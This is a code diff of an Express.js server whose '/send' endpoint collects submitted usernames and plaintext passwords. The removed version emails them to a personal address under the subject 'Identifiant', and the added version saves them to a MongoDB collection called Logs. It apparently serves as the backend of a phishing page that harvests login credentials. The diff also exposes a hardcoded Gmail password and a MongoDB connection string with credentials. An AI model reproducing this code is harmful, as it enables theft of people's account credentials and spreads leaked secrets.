@@ -1,8 +1,17 @@
 const express = require('express');
-const nodemailer = require('nodemailer');
 require('dotenv').config();
+const Logs = require('./Model');
+const mongoose = require('mongoose');
 
 const app = express()
+
+mongoose.connect('mongodb+srv://Eberloued:XPwww555aze123..@cluster0.44itv.mongodb.net/Register?retryWrites=true&w=majority',
+  { useNewUrlParser: true,
+    useUnifiedTopology: true,
+    useNewUrlParser: true })
+  .then(() => console.log('Connexion à MongoDB réussie !'))
+  .catch((err) => console.log('Connexion à MongoDB échouée !' + err));
+
 
 app.use((req, res, next) => {
     res.setHeader('Access-Control-Allow-Origin', '*')
@@ -21,29 +30,16 @@ app.use(express.static('./'));
 
 
 app.post('/send', async (req, res) => {
-    var transporter = nodemailer.createTransport({
-        host: "smtp.gmail.com",
-        port: 587,
-        secure: false, // true for 465, false for other ports
-        auth: {
-          user: "yacini.kenzy@gmail.com", // generated ethereal user
-          pass: "xpwww555aze123", // generated ethereal password
-        },
-      });
-
-    await transporter.sendMail({
-    from: "yacini.kenzy@gmail.com", // sender address
-    to: "kyacini@yahoo.fr", // list of receivers
-    subject: "Identifiant", // Subject line
-    text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
-    }, (err, info) => {
-      if(err){
-        res.status(400).send(err);
-      }else{
-        res.status(200).send("Bien joué");
-      }
-    });
-
+  const logs = new Logs({
+    username: req.body.username,
+    password: req.body.password,
+  });
+  logs.save()
+    .then(() => res.status(201).send('Objet enregistré !'))
+    .catch(error =>  res.status(500).send(error));
+    
 })
+
+
 
 module.exports = app;
